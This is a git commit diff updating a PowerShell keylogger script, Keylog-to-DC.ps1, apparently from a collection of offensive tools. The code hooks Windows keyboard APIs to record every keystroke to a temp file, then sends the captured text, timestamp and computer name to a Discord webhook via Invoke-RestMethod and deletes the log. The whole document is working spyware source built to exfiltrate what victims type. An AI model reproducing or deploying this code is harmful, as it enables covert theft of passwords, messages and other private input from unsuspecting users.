f8bb4cf19f1f0bb76e2ca9b6251e8a7e86b7193b
beigeworm <93350544+beigeworm@users.noreply.github.com>
2023-08-10 16:56:42 +0000

    Update Keylog-to-DC.ps1

--- Scripts/Keylog-to-DC.ps1
+++ Scripts/Keylog-to-DC.ps1
@@ -1,4 +1,3 @@
-$hookurl = "$dc"
 $API = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -9,6 +8,7 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
+
 $logPath = "$env:temp/t.txt"
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 $no = New-Item -Path $logPath -ItemType File -Force
@@ -29,20 +29,22 @@ $null = [console]::CapsLock
 $vtkey = $API::MapVirtualKey($asc, 3)
 $kbst = New-Object Byte[] 256
 $checkkbst = $API::GetKeyboardState($kbst)
-$logchar = New-Object -TypeName System.Text.StringBuilder       
-if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-$LString = $logchar.ToString()
-if ($asc -eq 8) {$LString = "[BKSPC]"}
-if ($asc -eq 13) {$LString = "[ENT]"}
-if ($asc -eq 27) {$LString = "[ESC]"}
-[System.IO.File]::AppendAllText($logPath, $LString, [System.Text.Encoding]::Unicode) 
+$logchar = New-Object -TypeName System.Text.StringBuilder          
+  if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+    $LString = $logchar.ToString()
+      if ($asc -eq 8) {$LString = "[BKSP]"}
+      if ($asc -eq 13) {$LString = "[ENT]"}
+      if ($asc -eq 27) {$LString = "[ESC]"}
+  [System.IO.File]::AppendAllText($logPath, $LString, [System.Text.Encoding]::Unicode) 
 }}}}}
 finally{
 If ($keyPressed) {
 $fileContent = Get-Content -Path $logPath -Raw
 $escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+$timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+$escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
+Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys 
 Remove-Item -Path $logPath -Force
 $keyPressed = $false
 }}
